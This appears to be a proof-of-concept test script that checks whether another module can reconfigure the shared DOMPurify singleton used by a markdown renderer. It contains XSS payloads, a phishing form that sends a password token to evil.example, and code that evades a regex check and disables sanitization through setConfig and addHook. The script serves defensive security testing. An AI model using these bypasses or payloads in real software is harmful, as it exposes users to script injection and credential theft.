// Does capturing the DOMPurify singleton from a SECOND module actually defeat
// renderMarkdown? Measured, not inferred. ABORTS if any prerequisite fails.
import { JSDOM } from 'jsdom';
const dom = new JSDOM('');
globalThis.window = dom.window;
globalThis.document = dom.window.document;

const { renderMarkdown } = await import('./.tmp-test-md/util/markdown.js');

const PHISH = '# hi <form action="https://evil.example"><input name=token type=password></form>';
const SCRIPTY = '<img src=x onerror=alert(1)><script>alert(2)</script>';

const base = { phish: renderMarkdown(PHISH), script: renderMarkdown(SCRIPTY) };
console.log('BASELINE phish :', JSON.stringify(base.phish));
console.log('BASELINE script:', JSON.stringify(base.script));

// PREREQUISITE: the baseline must actually be sanitizing, or nothing below means
// anything.
if (base.phish.includes('<form') || base.phish.includes('<input')) {
  console.error('ABORT: baseline is not sanitizing the phishing form'); process.exit(90);
}
if (base.script.includes('onerror') || base.script.includes('<script')) {
  console.error('ABORT: baseline is not sanitizing the script payload'); process.exit(91);
}

// ---- A. capture via a SPLIT specifier (defeats R8's regex) ----------------
const spec = 'dompur' + 'ify';
const P = (await import(spec)).default;

// PREREQUISITE: the split specifier must give the SAME object markdown.ts uses.
const direct = (await import('dompurify')).default;
if (P !== direct) { console.error('ABORT: split specifier is a different module instance'); process.exit(92); }
console.log('prereq: split specifier resolves to the same singleton object ->', P === direct);

// ---- B. setConfig (the form markdown.ts documents) -----------------------
P.setConfig({ FORBID_TAGS: [], FORBID_ATTR: [] });
console.log('AFTER setConfig({}) phish :', JSON.stringify(renderMarkdown(PHISH)));
console.log('AFTER setConfig({}) script:', JSON.stringify(renderMarkdown(SCRIPTY)));
P.clearConfig();

// ---- C. setConfig aimed at SCRIPT EXECUTION ------------------------------
P.setConfig({ ADD_TAGS: ['script'], ADD_ATTR: ['onerror'] });
const c = renderMarkdown(SCRIPTY);
console.log('AFTER setConfig(script) :', JSON.stringify(c));
console.log('   => script executes? ', c.includes('<script') || /onerror/i.test(c));
P.clearConfig();

// ---- D. addHook (the V23 form) -------------------------------------------
P.addHook('uponSanitizeElement', (_n, d) => { d.allowedTags[d.tagName] = true; });
P.addHook('uponSanitizeAttribute', (_n, d) => { d.forceKeepAttr = true; });
const d4 = renderMarkdown(SCRIPTY);
console.log('AFTER addHook          :', JSON.stringify(d4));
P.removeAllHooks();

// ---- E. restore check -----------------------------------------------------
console.log('RESTORED script        :', JSON.stringify(renderMarkdown(SCRIPTY)));
